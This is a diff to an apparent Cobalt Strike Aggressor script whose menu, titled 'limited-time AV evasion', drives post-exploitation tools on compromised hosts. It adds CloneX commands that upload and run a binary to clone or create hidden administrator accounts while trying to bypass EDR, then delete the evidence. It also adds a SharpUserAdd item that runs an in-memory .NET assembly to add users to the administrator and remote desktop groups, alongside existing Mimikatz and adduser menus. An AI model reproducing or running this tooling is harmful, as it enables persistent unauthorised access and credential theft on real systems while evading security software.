@@ -1,4 +1,42 @@
 menu "☆ 限时免杀"{
+    menu "CloneX"{
+        item "上传 CloneX" {
+		    blog($1, "\c9=========== 上传 CloneX ==========");
+            $bid = $1;
+            $dialog = dialog("上传CloneX", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &CloneX);
+            drow_text($dialog, "UploadPath",  "上传路径: ");
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);
+        }
+        sub CloneX {
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("/scripts/BypassCxk/Cl0neX.exe"));
+        }
+        item "运行 CloneX" {
+			blog($1, "\c9=========== 运行 CloneX ==========");
+            btask($bid, "CloneX help", "");
+            btask($bid, "1.Clone zhangsan as administrator: Cl0neX.exe zhangsan", "");
+            btask($bid, "2.Clone zhangsan as lisi: Cl0neX.exe zhangsan lisi", "");
+            btask($bid, "3.Add zhangsan/123456 account(try to bypass edr): Cl0neX.exe zhangsan 123456", "");
+            btask($bid, "4.Add zhangsan/123456 account(try to bypass edr) and clone as wangwu: Cl0neX.exe zhangsan 123456 wangwu", "");
+            btask($bid, "CloneX", "");
+            $bid = $1['@'];
+            $dialog = dialog("运行CloneX",%(exec => "Cl0neX.exe zhangsan 123456", bid => $bid),&CloneX_run);
+            drow_text($dialog, "exec", "Exec: ");
+            dbutton_action($dialog, "运行");
+            dialog_show($dialog);
+        }
+        sub CloneX_run {
+            $exec = $3['exec'];
+            bshell($bid, "$exec");
+        }
+        item "删除 CloneX" {
+			blog($1, "\c9=========== 删除 CloneX ==========");
+            $bid = $1['@'];
+            bshell($bid, " del /f /s /q Cl0neX.exe");
+        }   
+    }
+
     menu "Adduser"{
         item "上传 adduser" {
 		    blog($1, "\c9=========== 上传 adduser ==========");
@@ -28,8 +66,7 @@ menu "☆ 限时免杀"{
 			blog($1, "\c9=========== 删除 adduser ==========");
             $bid = $1['@'];
             bshell($bid, " del /f /s /q adduser.exe");
-        }
-        
+        }   
     }
     menu "Mimikatz" {
         item "上传 mimikatz" {
@@ -55,4 +92,19 @@ menu "☆ 限时免杀"{
             bshell($bid, " taskkill -f /im mimi.exe & del /f /s /q mimi.exe");
         }        
     }
+    item "SharpUserAdd" {
+        blog($1, "\c9=========== SharpUserAdd ==========");
+        $bid = $1['@'];
+        $dialog = dialog("SharpUserAdd (.NET 2.0)", %(exec => "test",bid => $bid), &SharpUserAdd);
+        dialog_description($dialog, "Bypass AV 利用 DirectoryService 命名空间将用户添加到管理员与远程桌面组");
+        drow_text($dialog, "exec", "参数：");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+    }
+
+    sub SharpUserAdd{
+        $arg = join(' ', @($3['exec']));
+        bexecute_assembly($bid, script_resource("/scripts/BypassCxk/SharpUserAdd.exe"), $arg);
+    }
+
 }
